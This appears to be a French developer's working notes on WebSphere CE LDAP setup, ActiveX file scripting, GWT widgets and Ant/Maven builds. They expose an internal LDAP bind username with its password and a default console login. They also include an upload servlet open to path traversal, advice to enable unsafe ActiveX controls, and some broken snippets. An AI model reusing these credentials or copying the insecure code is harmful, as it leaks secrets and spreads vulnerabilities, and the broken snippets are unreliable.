			2) earcontent ne doit pas être sous SVN mais META-INF oui.
si cache was ce fait chier: 
	regarder C:\Program Files\eclipseWASCE\servers\server1\var\config/config.xml.original et virer le projet qui marche pas
	supprimer les fichiers temp sous C:\Documents and Settings\Administrator\Local Settings\Temp
	renommer son appliweb et son application d'entreprise
	ou bien radical : recreer un nouvel ear qui contient l'appli web qu'on veut
wasadm est disponible sur http://www.intra.renault.fr/dtsi/intranet-rs3dt/Developpement/Homologation/Serveur/composantsServeur-Java.html
Les drivers sont disponibles sur http://www.intra.renault.fr/dtsi/intranet-rs3dt/Developpement/Composants/DriversJDBC/telechmDriversJDBC.html
les modules sont sur wasCE/server/server1/repository/renault-lib/
pour se connecter sur la console :system/manager
pour changer le nom de la connexion a arca: application > system module
pour activer la securite ldap: console d'administration serveur:
SECURITY REALM: other
REALM NAME: ARCA
domain name: ARCA
login module class: org.apache.geronimo.security.realm.providers.LDAPLoginModule
control flag: required
server-side: server side
Support Advanced Mapping: no
configuration options:
roleSearchMatching=(uniqueMember={0})
userSearchSubtree=true
roleName=cn
roleBase=ou=Applications,ou=FRA,ou=Rights,o=renault
userRoleName=objectClass
authentication=simple
connectionURL=ldap://anndev.mc2.renault.fr:389
connectionUsername=uid=AWTWSAD,ou=FRA,ou=People,o=renault
userBase=ou=People,o=renault
roleSearchSubtree=true
initialContextFactory=com.sun.jndi.ldap.LdapCtxFactory
connectionPassword=AWTWSAD
userSearchMatching=(uid={0})

Si lors du deploiement vous avez cette erreur : 
      Unable to resolve resource reference 'jdbc/Datasource' (Could not find resource 'siaDatasource'.  Perhaps it has not yet been configured, or your application does not have a dependency declared for that resource module?)
      Assurez vous d’avoir declare vos dependances dans geronimo-web.xml ET geronimo-application.xml 
Si une erreur avec LoginModule verifier que la case du realm est respectee dans web.xml (arca ou ARCA)

ACTIVEX : (ne peut pas s'executer sur un serveur)
Partie 1 : Objets 
L'objet ActiveX qui permet d'utiliser les fichiers est l'objet Scripting.FileSystemObject.
var fso=new ActiveXObject("Scripting.FileSystemObject"); 
Partie 2 : Creer un fichier 
La methode qui permet de creer un fichier est la methode CreateTextFile.
fso.CreateTextFile("Nom du fichier.extension",true);
>>Le deuxième argument precise si on veut ecraser le fichier deja present sous le meme nom s'il existe. 
Partie 3 : Utiliser un fichier 
La methode qui permet d'ouvrir un fichier est la methode OpenTextFile.
var otf=fso.OpenTextFile("Nom du fichier.extension",1 ,true);
>>Le deuxième argument precise le type d'ouverture : 1-Ouverture en lecture ; 2-Reecriture ; 8-Ecriture a la suite.
>>Le troisième argument precise de creer (true) ou non (false) le fichier s'il n'existe pas. 
Partie 3.1 : Ecrire dans un fichier 
La methode qui permet d'ecrire dans un fichier est la methode Write ou WriteLine.
otf.Write("Texte à marquer");
otf.WriteLine("Ligne à marquer");
>>Remarque : la methode WriteLine marque le texte entre en argument et lui rajoute un saut de ligne.
>>Remarque : le fichier doit d'abord être ouvert en reecriture ou en ecriture a la suite (2 ou 8). 
Partie 3.2 : Lire un fichier 
La methode qui permet de lire un fichier est la methode Read ou ReadAll.
otf.Read(9);
otf.ReadAll();
>>Remarque : Le fichier doit être ouvert en mode lecture.
>>Remarque : la methode Read lit le nombre de caractère entre en argument.
>>Remarque : la methode ReadAll lit tout le fichier. 
Partie 3.3 : Fermer un fichier 
La methode qui permet de fermer un fichier est la methode Close.
otf.Close();
Partie 4 : Supprimer un fichier 
La methode qui permet de supprimer un fichier est la methode DeleteFile.
fso.DeleteFile("Nom du fichier.extension");
Partie: Pour executer un fichier :
      shell=new ActiveXObject("WScript.shell"); 
      shell.run("\"C:\\Temp\\WINWORD.EXE");
      si j'ai une erreur dans ce script essayer sur IE: options> securitysettings>customs...>enable initialize and script ActiveX controls not marked safe... 
Partie 5 : Exemples 
var fso=new ActiveXObject("Scripting.FileSystemObject"); //Système de fichier.
fso.CreateTextFile("fichier1.txt",true); //Creation du fichier "fichier1.txt" avec ecrasement.
var otf=fso.OpenTextFile("fichier1.txt", 8 ,true); //Ouverture du fichier "fichier1.txt" en mode ecriture a la suite.
otf.WriteLine("Bonjour."); //Ecriture de la ligne "Bonjour.".
otf.Write("Coucou"); //Ecriture de "Coucou".
otf.Close(); //Fermeture du fichier "fichier1.txt".
otf=fso.OpenTextFile("fichier1.txt", 1 ,false); //Ouverture du fichier "fichier1.txt" en mode lecture.
alert(otf.Read(7)); //Lecture des 7 premiers caractères ("Bonjour.").
alert(otf.ReadAll()); //Lecture de tout le fichier ("Bonjour.\nCoucou").
otf.Close(); //Fermeture du fichier "fichier1.txt".
fso.DeleteFile("fichier1.txt"); //Suppression du fichier "fichier1.txt". 
Pour plus d'informations allez voir le site de bultez : http://marcel-bultez.chez-alice.fr/documents/SupportsRepertoiresFichiers.htm 

 
Checkstyle : voir ma doc: Installation_Applications_FWS_Avec_RAD_7_e1.a.V1.1.doc


GWT :
pour recuperer URL et plein d'autres parametres utiliser : 
    String toto = Window.Location.get... l'URL complette c'est : Window.Location.getHref();
quest ce qu'un module : c'est une autre application independante en principe mais ce module peut heriter de toutes les classes d'un autre module en mettant : <module rename-to="com.foo.MyModule"><inherits name="com.foo.MyModule" /></module> et alors plus besoin de lui mettre une entry-point class (il peut utiliser celui du module herite)
    il est defni dans un xxxxxx.gwt.xml qui doit être sous src/main/java/mon/package/Xxxx.gwt.xml il aura par defaut pour nom mon.package.Xxxx mais on peut le renomme dedans en mettant <module rename-to='yyyyy'> et pour l'appeler, dans le html on met: <script type="text/javascript" language="javascript" src="????/yyyy.nocache.js"></script>
 si j'ai l'erreur Could not open/create prefs root node Software\JavaSoft\Prefs
          essayer ca : open regedit.exe ( really hate Microsoft and their regedit.reg).
          change the permission of key: HKEY_LOCAL_MACHINE\SOFTWARE\JavaSoft.....Right click the icon, then change the permission to full operation.
          On 64-bit systems you need to create a key HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\JavaSoft\Prefs.
creer une application :
        se mettre sous D:\Installations\gwt-2.3.0
        tapper:
          webAppCreator -maven -junit D:\Maven\repo\junit\junit\4.10\junit-4.10.jar -out VotreProfWeb com.professeur.VotreProfApp
              dans ce cas fans eclipse faire un import de projet maven
                je pourrais alors faire après : 
                    mvn clean         # delete temporary stuff
                    mvn test          # run all the tests (gwt and junit)
                    mvn gwt:run       # run development mode
                    mvn gwt:compile   # compile to javascript
                    mvn package       # generate a .war package ready to deploy

          webAppCreator -junit D:\Maven\repo\junit\junit\4.10\junit-4.10.jar -out EvaluateurWeb com.sami.brauner.EvaluateurApp
          webAppCreator -junit D:\Installations\junit-4.8.2.jar -out WecWeb com.renault.wec.WecApp
          ou
          WebAppCreator.cmd -junit D:\Installations\junit-4.8.2.jar -maven com.gs.youandi.YouAnd
          le copier dans mon repertoire de workspace puis dans eclipse l'importer en tant que projet eclipse... tout fonctionne.
          Je peux remplacer dans le classpath du projet JUNIT 3 par JUNIT 4
           

formater une date : 
    datePicker.setText(DateTimeFormat.getFormat("DD-MM-YYYY").format(h.getVPA04_DATE()));
faire un formulaire de upload telechargement  d'image: 
      cote client :   
                      // FORMULAIRE D'IMAGE
                            formulaire = new FormPanel();
                            formulaire.setAction(GWT.getHostPageBaseURL()+"kanail/ProfileUploadServlet?id="+student.getVPA01_ID());
                            formulaire.setEncoding(FormPanel.ENCODING_MULTIPART);
                            formulaire.setMethod(FormPanel.METHOD_POST);
                            FileUpload upload = new FileUpload();
                            upload.setName("imageUpload");
                            upload.addChangeHandler(new ChangeHandler() {
                                @Override
                                public void onChange(ChangeEvent event) {
                    
                                                formulaire.submit();
                                            }
                                    }
                           );
                            formulaire.add(upload);
                            formulaire.addSubmitHandler(new FormPanel.SubmitHandler() {
                                public void onSubmit(FormPanel.SubmitEvent event) {
                                    // This event is fired just before the formulaire is submitted. We can take
                                    // this opportunity to perform validation.
                    //                if (tb.getText().length() == 0) {
                    //                    Window.alert("The text box must not be empty");
                    //                    event.cancel();
                    //                }
                                }
                            });
                            formulaire.addSubmitCompleteHandler(new FormPanel.SubmitCompleteHandler() {
                                @Override
                                public void onSubmitComplete(FormPanel.SubmitCompleteEvent event) {
                                   imagePane.getElement().setInnerHTML("<img src='"+event.getResults() + "'/>");
                                }
                            });
                            splitPanel.add(formulaire);
          cote serveur :
                        public class ProfileUpload extends HttpServlet {   // Une vraie servlet, pas un service RPC
                            @Override
                            protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
                                try {
                                    ServletFileUpload upload = new ServletFileUpload();  //LINKee"(çà)" Une requete request ajax arrive. pour charger une image en servlet <3.0 (// pour la version >=3.0 ajouter en tete de classe @WebServlet et @MultipartConfig et faire request.getParmeters il parrait que ça marche
                        //            response.setContentType("image/x-png");
                                    FileItemIterator iterator = upload.getItemIterator(req);
                                    while (iterator.hasNext()) { // mettre un name a mon champ fileUpload sinon passera pas par ici
                                        FileItemStream item = iterator.next();
                                        if (!item.isFormField()) {   // On ne s'interesse pas aux differents champs du formulaire mais on pourrait
                                            String filename = req.getParameter("id");
                                            filename=PersistanceManagerFactorySingleton.getInstance().getImages_path()+filename+".png";
                                            FileOutputStream out = new FileOutputStream(new File(filename));
                                            InputStream in = item.openStream();
                                            out.write(IOUtils.toByteArray(in));
                                            out.close();
                                            //response.getOutputStream().print(filename);   // On renvoie le nom d'origine du fichier ainsi que son nom aleatoire
                                            response.setContentType("text/html");
                                            response.getOutputStream().print(filename);
                                            //response.getWriter().printf(filename);
                                        }
                                    }
                                } catch (Exception ex) {
                                    throw new ServletException(ex);
                                }
                            }
                        }
Faire appel a un rpc :
    Class bidule
    {
    private LogginServiceAsync logginService;
    public bidule() //constructeur
    {
    logginService = GWT.create(LogginService.class);
    }
    (...)
     logginService.getStudentById(st, new AsyncCallback<VPA01_STUDENT>()
				{
				(...)
				}
    dans xxxx.gwt.xml
        <module>
              <!-- Inherit our applications main module.                      -->
              <inherits name='com.kanail.Kanail'/>
              <!-- Specify the path to any remote services.                   -->
              <servlet path="/kanail/loggin" class="com.kanail.server.MonRPC" />
        </module>
    dans web.xml :
    

checkbox : 
  CheckBox cb = new CheckBox(mats.getVPA02_NOM());
    	cb.getElement().setId(Long.toString(mats.getVPA02_ID()));
    	if (student.getMatieres().contains(mats))
    	{
    		cb.setValue(true);
    	}
    	matierestable.add(cb);
    	cb.addClickHandler(new ClickHandler() 
    	{
    	      @Override
    	      public void onClick(ClickEvent event) 
    	      {
    	        boolean checked = ((CheckBox) event.getSource()).getValue();
    	        String idmatiere = ((CheckBox) event.getSource()).getElement().getId();
    	        if(checked)
    	        {
    	        	for (VPA02_MATIERE allm : allMatieres)
    	        	{
    	        		String toto = Long.toString(allm.getVPA02_ID());
    	        		if (idmatiere.equals(toto) && !student.getMatieres().contains(allm))
    	        		{
    	        			String tata = "ahahahaha";
    	        			if (allm.getStudents()==null)
    	        			{
    	        				ArrayList<VPA01_STUDENT> sts = new ArrayList<VPA01_STUDENT>();
    	        				allm.setStudents(sts);
    	        			}
   	        				allm.getStudents().add(student);
    	        			student.getMatieres().add(allm);		
    	        		}
    	        	}
    	        }
    	        else
    	        {
    	        	for (VPA02_MATIERE allm : allMatieres)
    	        	{
    	        		String toto = Long.toString(allm.getVPA02_ID());
    	        		if (idmatiere.equals(toto) && student.getMatieres().contains(allm))
    	        		{
    	        			String tata = "ahahahaha";
    	        			student.getMatieres().remove(allm);		
    	        		}
    	        	}
    	        }
    	        updateStudent();
    	      }
    	    });
    }
une image : 
    final Image baseImg = new Image("imageTest.jpg");
boutton :bouton : button : buton : 
 Button b = new Button("Jump!", new ClickHandler() {
      public void onClick(ClickEvent event) {
        Window.alert("How high?");
      }
    });
faire un select
   final ListBox dropBox = new ListBox(false);
    dropBox.setVisibleItemCount(10); // pour plusieurs lignes visibles
    String[] listTypes = constants.cwListBoxCategories();
    for (int i = 0; i < listTypes.length; i++) {
      dropBox.addItem(listTypes[i]);
    }    
     dropBox.addChangeHandler(new ChangeHandler() {
      public void onChange(ChangeEvent event) {
        showCategory(multiBox, dropBox.getSelectedIndex());
        multiBox.ensureDebugId("cwListBox-multiBox");
      }
    });
eviter d'utiliser verticalpanel vpanel et horizontalpanel hpanel (ce sont des tableaux). Utiliser simplepanel et flow panel ou htmlpanel
exemple htmlpanel : 
String html = "<table>" +
	    				"<tr><td><div id='noml'/></td><td><div id='nomt'></td><td><div id='img'/></td></tr>"+
	    				"<tr><td><div id='prenoml'/></td><td><div id='prenomt'></td></tr>"+
	    				"<tr><td><div id='etablissementl'/></td><td><div id='etablissementt'></td></tr>"+
	    				"<tr><td><div id='classel'/></td><td><div id='classet'></td></tr>"+
	    				"<tr><td><div id='matieresl'/></td><td><div id='matierest'></td></tr>"+
	    				"</table>";
	    		HTMLPanel panel = new HTMLPanel(html);
	    		//panel.setSize("200px", "120px");
	    		//panel.addStyleName("demo-panel");
	    		
	    Label noml = new Label("Nom:");
	    TextBox nomt = new TextBox();
	    panel.add(noml,"noml");
	    panel.add(nomt,"nomt");
exemple de menu : 
			    FlowPanel vpanel = new FlowPanel();
			    vpanel.getElement().addClassName("zigzagmenu");
			    MenuBar collectionMenu = new MenuBar(true);
			    //collectionMenu.setAutoOpen(true);
			    collectionMenu.getElement().addClassName("white");
			    collectionMenu.addItem("<span class='blank'></span><span style='cursor:pointer'>Autumn Winter 2015-2016</span>", true, ,  new Command(){
                                    	      public void execute() 
                                    	      {
                                    			  History.newItem("groupes");
                                    	      }
                                    });
			    //collectionMenu.addItem("<span class='blank'></span><span>ta</span>", true, cmd);
			    //collectionMenu.addItem("<span class='blank'></span><span>tete</span>", true, cmd);
			    

			    MenuBar wDWorld = new MenuBar(true);
			    //wDWorld.setAutoOpen(true);
			    wDWorld.getElement().addClassName("black");
			    wDWorld.addItem("<span class='blank'></span><span style='cursor:pointer'>About Wenhua Duverg&eacute;</span>", true, Entry.wenhuaWorld);
			    //wDWorld.addItem("<span class='blank'></span><span>baz</span>", true, cmd);
			    //wDWorld.addItem("<span class='blank'></span><span>menu</span>", true, cmd);

			    // Make a new menu bar, adding a few cascading menus to it.
			    final MenuBar menu = new MenuBar();
			    menu.setAutoOpen(true);
			    menu.getElement().setClassName("menus");
			    menu.addItem("COLLECTION", collectionMenu);
			    menu.addItem("WENHUA DUVERG&Eacute;'S WORLD",true, wDWorld);

			    wDWorld.addDomHandler(new MouseOutHandler() {
			        public void onMouseOut(MouseOutEvent event) {
			        	menu.closeAllChildren(false);
			        }
			    }, MouseOutEvent.getType());
			    collectionMenu.addDomHandler(new MouseOutHandler() {
			        public void onMouseOut(MouseOutEvent event) {
			        	menu.closeAllChildren(false);
			        }
			    }, MouseOutEvent.getType());

pour faire un lien interne: 
new Hyperlink("libelleDuLien", Long.toString(st.VPA01_ID))
faire une dialogbox: message :
  declarer en tete de classe : 
  	final Button closeButton = new Button("OK");
    private DialogBox dialogBox;
    Initialiser le comportement du bouton : 
    	closeButton.addClickHandler(new ClickHandler() 
      {
            			
            			@Override
            			public void onClick(ClickEvent arg0) {
            				dialogBox.hide();
            				dialogBox=new DialogBox();
            			}
            		});
    et ensuite dans la methode :    
            dialogBox = new DialogBox(); fenetre modale aussi   
            dialogBox.hide();
            dialogBox.setText("No reconnu.");
          		             dialogBox.center();
          		            closeButton.setFocus(true);
          		            FlexTable inbox = new FlexTable();
          		            Label inboxText = new Label("Une erreur de saisie? Mot de passe perdu?");
          		            inbox.setWidget(0,0,inboxText);
          					inbox.setWidget(1,0,closeButton);
          		            dialogBox.add(inbox);
on peut overrider les css du gwt.xml en mettant ca dans le gwt.xml (NON C EST PAS LA MEILLEURE METHODE VOIR ClientBundle)
  <stylesheet src='../SamiCours.css'/> (NON C EST PAS LA MEILLEURE METHODE VOIR ClientBundle)
pour ajouter une class css à un widget element pannel etc : 
      FlexTable layout = new FlexTable();
	    layout.getElement().addClassName("center");
		            
ajouter une classe css à un element: 
    layout.getElement().addClassName("center");
ajouter des h2 ou directement du html 
  HTML html = new HTML("<h2>Headline</h2>");
  yourpannel.add(html);
pour qu'il ne compile permutation que pour un navigateur, plus rapide: ici chrome:
      dans fichier .gwt.xml sous les <inherit> mettre :<set-property name="user.agent" value="safari" /> 
avec maven pour ne pas faire jouer les tests surfire : mettre :          <skipTests>true</skipTests> 
                      <plugin>
                    <artifactId>maven-surefire-plugin</artifactId>
                    	<version>2.5</version>    il n'execute que les methodes qui commencent par test...dans les classes de test
                    <configuration>
                          <excludes>
                          <exclude>**/Import*Test.java</exclude> //pour qu'il n'execute pas certains tests(notemment marche pas bien si les tests executes par maven dependent de fichiers on dirait donc a desactiver )
                        </excludes>
                             <systemProperties>
                      (...)
                      </systemProperties>
                      <skipTests>true</skipTests>
                    </configuration>
                  </plugin>
    le build.xml : sous WecWeb\build.xml
                              <?xml version="1.0" encoding="utf-8" ?>
                          <project name="WecApp" default="build" basedir=".">
                            <!-- Arguments to gwtc and devmode targets -->
                            <property name="gwt.args" value="" />
                          
                            <!-- Configure path to GWT SDK -->
                            <property name="gwt.sdk" location="D:/Installations/gwt-2.3.0" />
                            <property name="jdo.file.dir" location="war\WEB-INF\classes\com\renault\wec\client\jdo"/>
                            <property name="log4j.config.file" location="D:\workspaceGanymedeGXT\WecWeb\src\log4j.properties" />
                            <path id="project.class.path">
                              <pathelement location="war/WEB-INF/classes"/>
                              <pathelement location="${gwt.sdk}/gwt-user.jar"/>
                              <fileset dir="${gwt.sdk}" includes="gwt-dev*.jar"/>
                              <!-- Add any additional non-server libs (such as JUnit) -->
                              <fileset dir="war/WEB-INF/lib" includes="**/*.jar"/>
                            </path>
                          
                            <target name="libs" description="Copy libs to WEB-INF/lib">
                              <mkdir dir="war/WEB-INF/lib" />
                              <copy todir="war/WEB-INF/lib" file="${gwt.sdk}/gwt-servlet.jar" />
                              <copy todir="war/WEB-INF/lib" file="${gwt.sdk}/gwt-servlet-deps.jar" />
                              <!-- Add any additional server libs that need to be copied -->
                            </target>
                          
                            <target name="javac" depends="libs" description="Compile java source to bytecode">
                              <mkdir dir="war/WEB-INF/classes"/>
                              <javac srcdir="src" includes="**" encoding="utf-8"
                                  destdir="war/WEB-INF/classes"
                                  source="1.5" target="1.5" nowarn="true"
                                  debug="true" debuglevel="lines,vars,source">
                                <classpath refid="project.class.path"/>
                              </javac>
                              <copy todir="war/WEB-INF/classes">
                                <fileset dir="src" excludes="**/*.java"/>
                              </copy>
                            </target>
                          
                            <target name="gwtc" depends="javac" description="GWT compile to JavaScript (production mode)">
                              <java failonerror="true" fork="true" classname="com.google.gwt.dev.Compiler">
                                <classpath>
                                  <pathelement location="src"/>
                                  <path refid="project.class.path"/>
                                  <pathelement location="D:/Installations/gwt-2.3.0/validation-api-1.0.0.GA.jar" />
                                  <pathelement location="D:/Installations/gwt-2.3.0/validation-api-1.0.0.GA-sources.jar" />
                                </classpath>
stack : stacks :                <!-- add jvmarg -Xss16M or similar if you see a StackOverflowError --> // la memoire stack est saturée. (memoire stack = methode qui appelle une methode qui... contient les vals des primitives seulmt) chaque thread a son stack et chaque stack de thread est invisible aux autres threads(threadsafe) 
                                <jvmarg value="-Xmx256M"/>
                                <arg line="-war"/>
                                <arg value="war"/>
                                <!-- Additional arguments like -style PRETTY or -logLevel DEBUG -->
                                <arg line="${gwt.args}"/>
                                <arg value="com.renault.wec.WecApp"/>
                              </java>
                            </target>
                          
                            <target name="devmode" depends="javac" description="Run development mode">
                              <java failonerror="true" fork="true" classname="com.google.gwt.dev.DevMode">
                                <classpath>
                                  <pathelement location="src"/>
                                  <path refid="project.class.path"/>
                                  <pathelement location="D:/Installations/gwt-2.3.0/validation-api-1.0.0.GA.jar" />
                                  <pathelement location="D:/Installations/gwt-2.3.0/validation-api-1.0.0.GA-sources.jar" />
                                </classpath>
                                <jvmarg value="-Xmx256M"/>
                                <arg value="-startupUrl"/>
                                <arg value="WecApp.html"/>
                                <arg line="-war"/>
                                <arg value="cheminversleWebContent"/>
                                <!-- Additional arguments like -style PRETTY or -logLevel DEBUG -->
                                <arg line="${gwt.args}"/>
                                <arg value="com.renault.wec.WecApp"/>
                              </java>
                            </target>
                          
                          	<target name="devmodeDebug" depends="javac" description="Run development mode"> // pour debugger debuger dans gwt gxt sert à debugger ca marche! voir le devmodeDebug du build.xml du projet wec. Dans eclipse il faut aussi faire run>Debug... creer un Remote Java Application > ConnectionType: Standard(SocketAttach) Host:localhost, Port:8000. Ensuite builder le xml en mode RUN et lancer le remote application en mode Debug
                          	    <java failonerror="true" fork="true" classname="com.google.gwt.dev.DevMode">
                          	      <classpath>
                          	        <pathelement location="src"/>
                          	        <path refid="project.class.path"/>
                          	        <pathelement location="D:/Installations/gwt-2.3.0/validation-api-1.0.0.GA.jar" />
                          	        <pathelement location="D:/Installations/gwt-2.3.0/validation-api-1.0.0.GA-sources.jar" />
                          	      </classpath>
                          	      <jvmarg value="-Xmx256M"/>
                          		  <jvmarg value="-Xdebug" />
                          	    <jvmarg value="-Xnoagent" />
                          	    <jvmarg value="-Djava.compiler=NONE" />
                          	      <jvmarg value="-Xrunjdwp:transport=dt_socket,server=y,suspend=y,address=8000" />
                          	      <arg value="-startupUrl"/>
                          	      <arg value="WecApp.html"/>
                          	      <arg line="-war"/>
                          	      <arg value="war"/>
                          	      <!-- Additional arguments like -style PRETTY or -logLevel DEBUG -->
                          	      <arg line="${gwt.args}"/>
                          	      <arg value="com.renault.wec.WecApp"/>
                          	    </java>
                          	  </target>
                          
                            <target name="javac.tests" depends="javac" description="Compiles test code">
                              <javac srcdir="test" includes="**" encoding="utf-8"
                                source="1.5" target="1.5" nowarn="true"
                                destdir="war/WEB-INF/classes"
                                debug="true" debuglevel="lines,vars,source">
                                <classpath location="D:\Installations\junit-4.8.2.jar"/>
                                <classpath refid="project.class.path"/>
                              </javac>
                            </target>
                            
                            <target name="test.dev" depends="javac.tests" description="Run development mode tests">
                              <mkdir dir="reports/htmlunit.dev" />
                              <junit fork="yes" printsummary="yes" haltonfailure="yes">
                                <jvmarg line="-Xmx256m" />
                                <sysproperty key="gwt.args" value="-standardsMode -logLevel WARN" />
                                <sysproperty key="java.awt.headless" value="true" />
                                <classpath>
                                  <pathelement location="src" />
                                  <pathelement location="test" />
                                  <path refid="project.class.path" />
                                  <pathelement location="D:/Installations/gwt-2.3.0/validation-api-1.0.0.GA.jar" />
                                  <pathelement location="D:/Installations/gwt-2.3.0/validation-api-1.0.0.GA-sources.jar" />
                                  <pathelement location="D:\Installations\junit-4.8.2.jar" />
                                </classpath>
                                <batchtest todir="reports/htmlunit.dev" >
                                  <fileset dir="test" >
                                    <include name="**/*Test.java" />
                                  </fileset>
                                </batchtest>
                                <formatter type="plain" />
                                <formatter type="xml" />
                              </junit>
                            </target>
                          
                            <target name="test.prod" depends="javac.tests" description="Run production mode tests">
                              <mkdir dir="reports/htmlunit.prod" />
                              <junit fork="yes" printsummary="yes" haltonfailure="yes">
                                <jvmarg line="-Xmx256m" />
                                <sysproperty key="gwt.args" value="-prod -standardsMode -logLevel WARN -standardsMode -out www-test" />
                                <sysproperty key="java.awt.headless" value="true" />
                                <classpath>
                                  <pathelement location="src" />
                                  <pathelement location="test" />
                                  <path refid="project.class.path" />
                                  <pathelement location="D:/Installations/gwt-2.3.0/validation-api-1.0.0.GA.jar" />
                                  <pathelement location="D:/Installations/gwt-2.3.0/validation-api-1.0.0.GA-sources.jar" />
                                  <pathelement location="D:\Installations\junit-4.8.2.jar" />
                                </classpath>
                                <batchtest todir="reports/htmlunit.prod" >
                                  <fileset dir="test" >
                                    <include name="**/*Test.java" />
                                  </fileset>
                                </batchtest>
                                <formatter type="plain" />
                                <formatter type="xml" />
                              </junit>
                            </target>
                          
                            <target name="test" description="Run development and production mode tests">
                              <antcall target="test.dev" />
                              <antcall target="test.prod" />
                            </target>
                          
                            <target name="hosted" depends="devmode" description="Run development mode (NOTE: the 'hosted' target is deprecated)" />
                          
                            <target name="build" depends="gwtc" description="Build this project" />
                          
                            <target name="war" depends="build" description="Create a war file">
                              <zip destfile="WecApp.war" basedir="war"/>
                            </target>
                          
                            <target name="clean" description="Cleans this project">
                              <delete dir="war/WEB-INF/classes" failonerror="false" />
                              <delete dir="war/wecapp" failonerror="false" />
                            </target>
                          
                          	
                          	<target name="enhance">
                          
                          	        <!-- define the task enhancer -->
                          	        <taskdef name="enhancer" classname="org.datanucleus.enhancer.tools.EnhancerTask">
                          	            <classpath refid="project.class.path"/>
                          	        </taskdef>
                          
                          	        <!-- enhance -->
                          	        <enhancer classpathref="project.class.path"
                          	            dir="war\WEB-INF\classes\com\renault\wec\client\jdo"
                          	            verbose="true">
                          	            <sysproperty key="log4j.configuration" value="file:${log4j.config.file}"/>
                          	            <sysproperty key="datanucleus.metadata.validate" value="false"/>
                          
                          	            <fileset dir="${jdo.file.dir}">
                          	                <include name="**/*.class"/>
                         	                  <directory>${basedir}/src/main/build/QA</directory>
                                            <outputDirectory>/bin</outputDirectory>
                                             <includes>
                                                <include>start.sh</include>
                                             </includes>
                                             <lineEnding>unix</lineEnding> // pour que maven fasse un Dos2unix
                          	            </fileset>
                          	        </enhancer>
                          	    </target>	
                          </project>

pour ajouter une class css à un widget element pannel etc : 
      FlexTable layout = new FlexTable();
	    layout.getElement().addClassName("center");
      
si j'ai l'erreur : 
    [WARN] Field 'final java.lang.String id' will not be serialized because it is final
          bien s'assurer que ma servlet envoie un objet serialisable sinon le post ne marchera pas. Si par ex j'envoie une arraylist sans specifie la typologie d'un objet serialisable ca va me faire un warning et le post ne marchera pas
          donc mon service doit renvoyer ArrayList<WEC53_D_CMPDMD> (avec son interface List) ou WEC53_D_CMPDMD est une classe serialisable 
http://code.google.com/webtoolkit/tools.html
http://darkdown.instantiations.com/D2GWT/continuous/latest/update/3.4
http://darkdown.instantiations.com/D2GWT/continuous/latest/update/3.6/
plugin gwt
json1-3.jar jsongrid

creer une application :
        se mettre sous D:\Installations\gwt-2.3.0
        tapper:  
          webAppCreator -junit D:\Installations\junit-4.8.2.jar -out WecWeb com.renault.wec.WecApp
          ou
          WebAppCreator.cmd -junit D:\Installations\junit-4.8.2.jar -maven com.gs.youandi.YouAnd
          le copier dans mon repertoire de workspace puis dans eclipse l'importer en tant que projet eclipse... tout fonctionne.
          Je peux remplacer dans le classpath du projet JUNIT 3 par JUNIT 4
  Installer gwt-ext :(gxt :):
      Metre GWT-Ext jar dans les librairies du projet eclipse. 
      Si je n'utilise pas ant: Rajouter son chemin dans les fichiers compile.cmd et shell.cmd comme pour gwt-user.jar
      Si j'utilise ant: pas la peine: je clean avec ant , je rebuild et ca va marcher.
          ajouter
              <inherits name='com.extjs.gxt.ui.GXT'/>
          Sur le fichier du xml du module gwt
          copier le repertoire ressource de gxt sous
             D:\workspaceGanymedeGXT\WecWeb\war
             ou
             C:\eclipse-jee-ganymede-SR2-win32\gwt-2.1.0\YouAndI\src\main\webapp
            Modifier le fichier Module.html:
              ajouter: 
              <link rel="stylesheet" type="text/css" href="gxtresources/css/gxt-all.css" /> NON C EST PAS LA MEILLEURE METHODE VOIR ClientBundle
              ...et...
              <script language='javascript' src='gxtresources/flash/swfobject.js'></script>
              ---> les resources de gxt sont tout de suite prises en compte!:-)
pour creer une session utilisateur dans gwt:  (on peut le faire sous une classe serviceimpl qui etend RemoteServiceServlet)
      HttpSession session = this.getThreadLocalRequest().getSession();
      HTTPSession session = request.getSession(); 
      on peut meme y stocker des gros objets contenant eux meme une liste d'objets à condition qu'ils soient serialisables: 
        VPA01_STUDENT userConnecte  = (VPA01_STUDENT)session.getAttribute("User");
pour Yahoo + gwt:
      (...Pour integrer la bibliothèques JavaScript Yahoo qui implemente le glissez deposez)
        mettre dans rep "public" fichiers yahoo.js, dom.js, event.js, dragdrop.js et DDPlayer.js
        à  l'extrême fin de ces fichiers rajouter : 
        function yahooIsOk() {
        }
        dragdropIsOk pour dragdrop.js, et ainsi de suite. 
        dans <nom-module>.gwt.xml rajouter pour chaque .js: au sein de la balise XML racine ("module"), comme suit : *
        <module>
        ...
         <script src="yahoo.js"><![CDATA[
         if ($wnd.yahooIsOk)
          return true;
         else
          return false;
         ]]>
            </script>
            <script src="dom.js"><![CDATA[
         if ($wnd.domIsOk)
          return true;
         else
          return false;
         ]]>
            </script>
        ...
        <module>
        dans code java:
        public native void setLocation(Element e, int leftPos, int topPos)
        /*-{
          $wnd.YAHOO.util.Dom.setStyle(e, 'left', leftPos+'px');
          $wnd.YAHOO.util.Dom.setStyle(e, 'top', topPos+'px');
        }-*/;
        pas d'implementation car methode native
        mais commentaire particulier GWT /*- et -*/. Contenu commentaire = javascript predede par "$wnd"
Pour faire un drag and drop: 
      l'avatar javascript de chaque widget est l'objet element: widget.getElement().(peut être utilise dans le code JavaScript )
Donc pour faire un drag and drop avec yahoo.js:
        public static native void addDraggableSlot(
        		Element e, 
        		String affordance,
        		int counter) 
        	/*-{
        		e.id = 'drag_'+counter;
        		new $wnd.YAHOO.example.DDPlayer(e.id, affordance);
            	}-*/;
        // l'objet e peut maintenant etre drague
        
        	public static native void addTargetSlot(
        		Element e, 
        		String affordance, 
        		int counter) 
        	/*-{
        		e.id = 'target_'+counter;
        		new $wnd.YAHOO.util.DDTarget(e.id, affordance);
        	}-*/;
        // l'objet e peut maintenant etre la cible d'un autre objet drague
        

si on a une erreur gwt de type :
      [ERROR] Unable to instantiate 'com.printflux.server.MyTreeServiceImpl'
      java.lang.ClassNotFoundException: com.printflux.server.MyTreeServiceImpl
                  at com.google.gwt.dev.shell.GWTShellServlet.tryGetOrLoadServlet(GWTShellServlet.java:874)
                  at com.google.gwt.dev.shell.GWTShellServlet.service(GWTShellServlet.java:240)
                  at javax.servlet.http.HttpServlet.service(HttpServlet.java:802)
      c'est parce qu'il lui manque des classes sous le repertoire "bin"

